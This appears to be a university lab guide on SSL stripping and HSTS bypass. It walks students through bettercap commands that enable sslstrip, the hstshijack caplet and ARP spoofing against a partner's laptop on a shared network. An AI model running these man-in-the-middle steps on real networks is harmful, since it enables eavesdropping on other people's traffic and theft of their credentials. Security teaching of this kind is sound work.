# SSLSTRIP + HSTSHIJACK

**SSL Stripping** or an **SSL Downgrade Attack** is an attack used to circumvent the security enforced by SSL certificates on HTTPS-enabled websites. In other words, SSL stripping is a technique that downgrades your connection from secure HTTPS to insecure HTTP and exposes you to eavesdropping and data manipulation.

**HTTP Strict Transport Security (HSTS)** is a policy mechanism that helps to protect websites against man-in-the-middle attacks such as protocol downgrade attacks and cookie hijacking. It allows web servers to declare that web browsers (or other complying user agents) should automatically interact with it using only HTTPS connections, which provide Transport Layer Security (TLS/SSL), unlike the insecure HTTP used alone.

The HSTS Policy is communicated by the server to the user agent via an HTTP response header field named **Strict-Transport-Security**. HSTS Policy specifies a period of time during which the user agent should only access the server in a secure fashion. Websites using HSTS often do not accept clear text HTTP, either by rejecting connections over HTTP or systematically redirecting users to HTTPS (though this is not required by the specification). The consequence of this is that a user-agent not capable of doing TLS will not be able to connect to the site.

## SSLSTRIP + HSTSHIJACK with BETTERCAP 
### **Goal**
In this session, our goal is to clone start an **sslstrip** attack against a victim also using the **hstshijack** module in order to avoid website **hsts** protection policy.

### **Settings**
Work in group with another collegue in order to work on your own laptop (avoiding GNS3 lab)
 * **Attacker:** you (in my case **192.168.1.135**)
 * **Victim:** your collegue (in my case **192.168.1.132**)
 * **Router:** you can use your phone. Both the **Attacker** and the **Victim** must be connected to the same network 

### **Steps**
 1. Login as root and install **bettercap**

        sudo su
        apt install bettercap

 2. Check your `iface` name

        iw dev

![alt text](https://github.com/fpacenza/NetworkAndSecurity/blob/main/sslstrip/1.%20iw%20dev.png?raw=true)

 3. Run **bettercap** over your **iface**

        bettercap -iface wlp59s0
 4. Update **bettercap** mudules **(caplets)**
        
        caplets.updates
        caplets.show

 5. Check if **hstshijack/hstshijack** is installed

![alt text](https://github.com/fpacenza/NetworkAndSecurity/blob/main/sslstrip/2.%20caplets.png?raw=true)

 6. Run **help** and check enabled modules

        help

![alt text](https://github.com/fpacenza/NetworkAndSecurity/blob/main/sslstrip/3.%20modules%20enabled.png?raw=true)


 7. Set the **sslstrip** to **true** and enable **hstshijack** module:
       
        set http.proxy.sslstrip true
        hstshijack/hstshijack

 8. Check (again) enabled modules

        help

![alt text](https://github.com/fpacenza/NetworkAndSecurity/blob/main/sslstrip/4.%20modules%20enabled.png?raw=true)

 9. Finally, enable **net.probe**, **net.sniff** and **arp.spoof** modules (respect this order!)

        net.probe on
        net.sniff on
        arp.spoof on

 10. Check (again and again) enabled modules

![alt text](https://github.com/fpacenza/NetworkAndSecurity/blob/main/sslstrip/5.%20modules%20enabled.png?raw=true)

 11. On the **Victim** side try to navigate and https website
 

**Attention:** modern browser are able to prevent this kind of attack. If you are not to fully replicate the attack on your personal laptop, don't worry, try on the GNS3 laboratory (or study more in order to made it compatible also with modern technologies)